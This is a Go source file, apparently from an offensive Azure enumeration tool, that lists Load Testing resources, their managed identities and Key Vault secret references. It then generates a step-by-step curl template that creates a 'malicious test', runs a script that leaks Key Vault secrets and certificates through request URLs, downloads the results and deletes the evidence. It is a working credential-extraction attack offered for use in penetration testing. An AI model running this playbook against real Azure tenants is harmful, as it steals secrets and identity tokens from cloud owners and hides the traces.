package azure

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/loadtesting/armloadtesting"
	"github.com/BishopFox/cloudfox/globals"
)

// ==================== LOAD TESTING STRUCTURES ====================

// LoadTestResource represents an Azure Load Testing resource
type LoadTestResource struct {
	Name            string
	ID              string
	Location        string
	ResourceGroup   string
	SubscriptionID  string
	DataPlaneURI    string
	IdentityType    string
	SystemAssigned  bool
	UserAssignedIDs string
	PrincipalID     string
}

// LoadTest represents a test within a Load Testing resource
type LoadTest struct {
	TestID                    string
	DisplayName               string
	Description               string
	Kind                      string // JMX or Locust
	KeyVaultReferenceIdentity string
	MetricsReferenceIdentity  string
	EngineBuiltinIdentity     string
	Secrets                   map[string]KeyVaultReference
	Certificate               *KeyVaultReference
	EnvironmentVariables      map[string]string
	TestScriptFileName        string
}

// KeyVaultReference represents a Key Vault secret or certificate reference
type KeyVaultReference struct {
	Name string
	URL  string
	Type string // AKV_SECRET_URI or AKV_CERT_URI
}

// ==================== LOAD TESTING HELPERS ====================

// GetLoadTestingResources retrieves all Load Testing resources in a subscription
func GetLoadTestingResources(session *SafeSession, subscriptionID string, resourceGroups []string) ([]LoadTestResource, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}
	cred := &StaticTokenCredential{Token: token}
	ctx := context.Background()

	client, err := armloadtesting.NewLoadTestsClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	var results []LoadTestResource

	// If specific resource groups provided, enumerate those
	if len(resourceGroups) > 0 {
		for _, rgName := range resourceGroups {
			pager := client.NewListByResourceGroupPager(rgName, nil)
			for pager.More() {
				page, err := pager.NextPage(ctx)
				if err != nil {
					continue
				}
				for _, res := range page.Value {
					results = append(results, convertLoadTestResource(ctx, session, res, rgName, subscriptionID))
				}
			}
		}
	} else {
		// Otherwise, enumerate all Load Testing resources in subscription
		pager := client.NewListBySubscriptionPager(nil)
		for pager.More() {
			page, err := pager.NextPage(ctx)
			if err != nil {
				return results, err
			}
			for _, res := range page.Value {
				rgName := GetResourceGroupFromID(SafeStringPtr(res.ID))
				results = append(results, convertLoadTestResource(ctx, session, res, rgName, subscriptionID))
			}
		}
	}

	return results, nil
}

// convertLoadTestResource converts SDK Load Test resource to our struct
func convertLoadTestResource(ctx context.Context, session *SafeSession, res *armloadtesting.LoadTestResource, resourceGroup, subscriptionID string) LoadTestResource {
	result := LoadTestResource{
		Name:            SafeStringPtr(res.Name),
		ID:              SafeStringPtr(res.ID),
		Location:        SafeStringPtr(res.Location),
		ResourceGroup:   resourceGroup,
		SubscriptionID:  subscriptionID,
		UserAssignedIDs: "N/A",
	}

	if res.Properties != nil && res.Properties.DataPlaneURI != nil {
		result.DataPlaneURI = *res.Properties.DataPlaneURI
	}

	// Extract managed identity information
	if res.Identity != nil {
		if res.Identity.Type != nil {
			result.IdentityType = string(*res.Identity.Type)
		}
		if res.Identity.PrincipalID != nil {
			result.PrincipalID = SafeStringPtr(res.Identity.PrincipalID)
		}

		// Check for system-assigned identity
		if result.IdentityType == "SystemAssigned" || result.IdentityType == "SystemAssigned, UserAssigned" {
			result.SystemAssigned = true
		}

		// Check for user-assigned identities
		if res.Identity.UserAssignedIdentities != nil {
			var userIDs []string

			for resourceID := range res.Identity.UserAssignedIdentities {
				userIDs = append(userIDs, resourceID)
			}

			if len(userIDs) > 0 {
				result.UserAssignedIDs = ""
				for i, id := range userIDs {
					if i > 0 {
						result.UserAssignedIDs += ", "
					}
					result.UserAssignedIDs += id
				}
			}
		}
	}

	return result
}

// GetLoadTestsForResource retrieves all tests for a Load Testing resource using data plane API
func GetLoadTestsForResource(session *SafeSession, dataPlaneURI string) ([]LoadTest, error) {
	// Get token for Load Testing data plane
	token, err := session.GetTokenForResource("https://cnt-prod.loadtesting.azure.com/")
	if err != nil {
		return nil, err
	}

	if dataPlaneURI == "" {
		return []LoadTest{}, nil
	}

	// Call data plane API to list tests
	url := fmt.Sprintf("https://%s/tests?api-version=2022-11-01", dataPlaneURI)

	config := DefaultRateLimitConfig()
	config.MaxRetries = 5
	config.InitialDelay = 2 * time.Second
	config.MaxDelay = 2 * time.Minute

	body, err := HTTPRequestWithRetry(context.Background(), "GET", url, token, nil, config)
	if err != nil {
		return nil, err
	}

	var testListResponse struct {
		Value []struct {
			TestID string `json:"testId"`
		} `json:"value"`
	}

	if err := json.Unmarshal(body, &testListResponse); err != nil {
		return nil, err
	}

	var results []LoadTest

	// Get details for each test
	for _, testSummary := range testListResponse.Value {
		test, err := getLoadTestDetails(token, dataPlaneURI, testSummary.TestID)
		if err == nil {
			results = append(results, test)
		}
	}

	return results, nil
}

// getLoadTestDetails retrieves detailed information about a specific test
func getLoadTestDetails(token, dataPlaneURI, testID string) (LoadTest, error) {
	url := fmt.Sprintf("https://%s/tests/%s?api-version=2022-11-01", dataPlaneURI, testID)

	config := DefaultRateLimitConfig()
	config.MaxRetries = 5
	config.InitialDelay = 2 * time.Second
	config.MaxDelay = 2 * time.Minute

	body, err := HTTPRequestWithRetry(context.Background(), "GET", url, token, nil, config)
	if err != nil {
		return LoadTest{}, err
	}

	var testDetails struct {
		TestID                string   `json:"testId"`
		DisplayName           string   `json:"displayName"`
		Description           string   `json:"description"`
		Kind                  string   `json:"kind"`
		KeyVaultReferenceType string   `json:"keyvaultReferenceIdentityType"`
		KeyVaultReferenceID   string   `json:"keyvaultReferenceIdentityId"`
		MetricsReferenceType  string   `json:"metricsReferenceIdentityType"`
		MetricsReferenceID    string   `json:"metricsReferenceIdentityId"`
		EngineBuiltinType     string   `json:"engineBuiltinIdentityType"`
		EngineBuiltinIDs      []string `json:"engineBuiltinIdentityIds"`
		Secrets               map[string]struct {
			Value string `json:"value"`
			Type  string `json:"type"`
		} `json:"secrets"`
		Certificate struct {
			Name  string `json:"name"`
			Value string `json:"value"`
			Type  string `json:"type"`
		} `json:"certificate"`
		EnvironmentVariables map[string]string `json:"environmentVariables"`
		InputArtifacts       struct {
			TestScriptFileInfo struct {
				FileName string `json:"fileName"`
			} `json:"testScriptFileInfo"`
		} `json:"inputArtifacts"`
	}

	if err := json.Unmarshal(body, &testDetails); err != nil {
		return LoadTest{}, err
	}

	test := LoadTest{
		TestID:                    testDetails.TestID,
		DisplayName:               testDetails.DisplayName,
		Description:               testDetails.Description,
		Kind:                      testDetails.Kind,
		KeyVaultReferenceIdentity: testDetails.KeyVaultReferenceType,
		MetricsReferenceIdentity:  testDetails.MetricsReferenceType,
		EngineBuiltinIdentity:     testDetails.EngineBuiltinType,
		Secrets:                   make(map[string]KeyVaultReference),
		EnvironmentVariables:      testDetails.EnvironmentVariables,
		TestScriptFileName:        testDetails.InputArtifacts.TestScriptFileInfo.FileName,
	}

	// If user-assigned identity is used, capture the ID
	if testDetails.KeyVaultReferenceID != "" {
		test.KeyVaultReferenceIdentity = testDetails.KeyVaultReferenceID
	}

	// Parse secrets
	for name, secret := range testDetails.Secrets {
		test.Secrets[name] = KeyVaultReference{
			Name: name,
			URL:  secret.Value,
			Type: secret.Type,
		}
	}

	// Parse certificate
	if testDetails.Certificate.Name != "" {
		test.Certificate = &KeyVaultReference{
			Name: testDetails.Certificate.Name,
			URL:  testDetails.Certificate.Value,
			Type: testDetails.Certificate.Type,
		}
	}

	return test, nil
}

// GenerateLoadTestExtractionTemplate creates a template for extracting credentials using Load Testing
func GenerateLoadTestExtractionTemplate(resource LoadTestResource, tests []LoadTest, testType string) string {
	template := fmt.Sprintf("# Load Testing Credential Extraction Template\n")
	template += fmt.Sprintf("# Resource: %s\n", resource.Name)
	template += fmt.Sprintf("# Resource Group: %s\n", resource.ResourceGroup)
	template += fmt.Sprintf("# Subscription: %s\n\n", resource.SubscriptionID)

	if resource.IdentityType == "" || resource.IdentityType == "None" {
		template += "# WARNING: No managed identity attached to this Load Testing resource\n"
		template += "# Cannot extract Key Vault references without a managed identity\n\n"
		return template
	}

	template += fmt.Sprintf("# Identity Type: %s\n", resource.IdentityType)
	if resource.SystemAssigned {
		template += fmt.Sprintf("# System-Assigned Principal ID: %s\n", resource.PrincipalID)
	}
	if resource.UserAssignedIDs != "" && resource.UserAssignedIDs != "N/A" {
		template += fmt.Sprintf("# User-Assigned Identities: %s\n", resource.UserAssignedIDs)
	}
	template += "\n"

	// Collect all unique secrets and certs from existing tests
	uniqueSecrets := make(map[string]KeyVaultReference)
	var cert *KeyVaultReference

	for _, test := range tests {
		for name, secret := range test.Secrets {
			uniqueSecrets[name] = secret
		}
		if test.Certificate != nil && cert == nil {
			cert = test.Certificate
		}
	}

	if len(uniqueSecrets) == 0 && cert == nil {
		template += "# No Key Vault references found in existing tests\n\n"
	} else {
		template += "# Key Vault References Found:\n"
		for _, secret := range uniqueSecrets {
			template += fmt.Sprintf("#   Secret: %s -> %s\n", secret.Name, secret.URL)
		}
		if cert != nil {
			template += fmt.Sprintf("#   Certificate: %s -> %s\n", cert.Name, cert.URL)
		}
		template += "\n"
	}

	template += "## Step 1: Get Access Token\n\n"
	template += "```bash\n"
	template += "ACCESS_TOKEN=$(az account get-access-token --resource https://cnt-prod.loadtesting.azure.com/ --query accessToken -o tsv)\n"
	template += "```\n\n"

	template += "## Step 2: Create Malicious Test\n\n"
	template += "```bash\n"
	template += "TEST_GUID=$(uuidgen)\n"
	template += fmt.Sprintf("DATA_PLANE_URI=\"%s\"\n\n", resource.DataPlaneURI)

	// Build secrets JSON
	secretsJSON := "null"
	if len(uniqueSecrets) > 0 {
		secretsJSON = "{"
		first := true
		for _, secret := range uniqueSecrets {
			if !first {
				secretsJSON += ", "
			}
			secretsJSON += fmt.Sprintf("\\\"%s\\\": {\\\"value\\\": \\\"%s\\\", \\\"type\\\": \\\"AKV_SECRET_URI\\\"}", secret.Name, secret.URL)
			first = false
		}
		secretsJSON += "}"
	}

	// Build certificate JSON
	certJSON := "null"
	if cert != nil {
		certJSON = fmt.Sprintf("{\\\"name\\\": \\\"%s\\\", \\\"value\\\": \\\"%s\\\", \\\"type\\\": \\\"AKV_CERT_URI\\\"}", cert.Name, cert.URL)
	}

	template += fmt.Sprintf("curl -X PATCH \"https://${DATA_PLANE_URI}/tests/${TEST_GUID}?api-version=2024-12-01-preview\" \\\n")
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\" \\\n"
	template += "  -H \"Content-Type: application/merge-patch+json\" \\\n"
	template += "  -d '{\n"
	template += "    \"testId\": \"'${TEST_GUID}'\",\n"
	template += "    \"displayName\": \"microburst\",\n"
	template += "    \"description\": \"\",\n"
	template += "    \"kind\": \"" + testType + "\",\n"
	template += "    \"loadTestConfiguration\": {\n"
	template += "      \"engineInstances\": 1,\n"
	template += "      \"splitAllCSVs\": false\n"
	template += "    },\n"
	template += "    \"secrets\": " + secretsJSON + ",\n"
	template += "    \"certificate\": " + certJSON + ",\n"
	template += "    \"environmentVariables\": {},\n"
	template += "    \"keyvaultReferenceIdentityType\": \"" + resource.IdentityType + "\",\n"
	template += "    \"metricsReferenceIdentityType\": \"" + resource.IdentityType + "\",\n"
	template += "    \"engineBuiltinIdentityType\": \"" + resource.IdentityType + "\"\n"
	template += "  }'\n"
	template += "```\n\n"

	template += "## Step 3: Upload Test Script\n\n"
	template += "```bash\n"
	if testType == "JMX" {
		template += "# Download the microburst.jmx test script from MicroBurst repository\n"
		template += "curl -X PUT \"https://${DATA_PLANE_URI}/tests/${TEST_GUID}/files/microburst.jmx?fileType=TEST_SCRIPT&api-version=2024-12-01-preview\" \\\n"
	} else {
		template += "# Download the microburst.py test script from MicroBurst repository\n"
		template += "curl -X PUT \"https://${DATA_PLANE_URI}/tests/${TEST_GUID}/files/microburst.py?fileType=TEST_SCRIPT&api-version=2024-12-01-preview\" \\\n"
	}
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\" \\\n"
	template += "  -H \"Content-Type: application/octet-stream\" \\\n"
	if testType == "JMX" {
		template += "  --data-binary @microburst.jmx\n"
	} else {
		template += "  --data-binary @microburst.py\n"
	}
	template += "```\n\n"

	template += "## Step 4: Wait for Validation\n\n"
	template += "```bash\n"
	template += "# Poll until validation succeeds\n"
	template += "while true; do\n"
	template += "  STATUS=$(curl -s \"https://${DATA_PLANE_URI}/tests/${TEST_GUID}?api-version=2024-12-01-preview\" \\\n"
	template += "    -H \"Authorization: Bearer ${ACCESS_TOKEN}\" | jq -r '.inputArtifacts.testScriptFileInfo.validationStatus')\n"
	template += "  if [ \"$STATUS\" == \"VALIDATION_SUCCESS\" ]; then break; fi\n"
	template += "  sleep 15\n"
	template += "done\n"
	template += "```\n\n"

	template += "## Step 5: Run Test\n\n"
	template += "```bash\n"
	template += "RUN_GUID=$(uuidgen)\n\n"
	template += "curl -X PATCH \"https://${DATA_PLANE_URI}/test-runs/${RUN_GUID}?api-version=2024-12-01-preview\" \\\n"
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\" \\\n"
	template += "  -H \"Content-Type: application/merge-patch+json\" \\\n"
	template += "  -d '{\n"
	template += "    \"testId\": \"'${TEST_GUID}'\",\n"
	template += "    \"displayName\": \"microburst\",\n"
	template += "    \"secrets\": " + secretsJSON + ",\n"
	template += "    \"certificate\": " + certJSON + ",\n"
	template += "    \"environmentVariables\": {},\n"
	template += "    \"debugLogsEnabled\": false,\n"
	template += "    \"requestDataLevel\": \"NONE\"\n"
	template += "  }'\n"
	template += "```\n\n"

	template += "## Step 6: Wait for Results\n\n"
	template += "```bash\n"
	template += "# Poll until test completes\n"
	template += "while true; do\n"
	template += "  STATUS=$(curl -s \"https://${DATA_PLANE_URI}/test-runs/${RUN_GUID}?api-version=2024-12-01-preview\" \\\n"
	template += "    -H \"Authorization: Bearer ${ACCESS_TOKEN}\" | jq -r '.status')\n"
	template += "  echo \"Status: $STATUS\"\n"
	template += "  if [ \"$STATUS\" == \"DONE\" ]; then break; fi\n"
	template += "  sleep 30\n"
	template += "done\n"
	template += "```\n\n"

	template += "## Step 7: Download and Parse Results\n\n"
	template += "```bash\n"
	template += "# Get results file URL\n"
	template += "RESULTS_URL=$(curl -s \"https://${DATA_PLANE_URI}/test-runs/?testId=${TEST_GUID}&api-version=2024-12-01-preview\" \\\n"
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\" | \\\n"
	template += "  jq -r '.value[] | select(.testRunId == \"'${RUN_GUID}'\") | .testArtifacts.outputArtifacts.resultFileInfo.url')\n\n"
	template += "# Download and extract results\n"
	template += "curl -o results.zip \"${RESULTS_URL}\"\n"
	template += "unzip results.zip -d results\n\n"
	template += "# Parse CSV for token/secrets (base64 encoded in URL)\n"
	template += "# The microburst test script encodes credentials in HTTP request URLs\n"
	template += "cat results/engine1_results.csv\n"
	template += "```\n\n"

	template += "## Step 8: Cleanup\n\n"
	template += "```bash\n"
	template += "# Delete the test\n"
	template += "curl -X DELETE \"https://${DATA_PLANE_URI}/tests/${TEST_GUID}?api-version=2024-12-01-preview\" \\\n"
	template += "  -H \"Authorization: Bearer ${ACCESS_TOKEN}\"\n\n"
	template += "# Cleanup local files\n"
	template += "rm -rf results results.zip\n"
	template += "```\n\n"

	return template
}
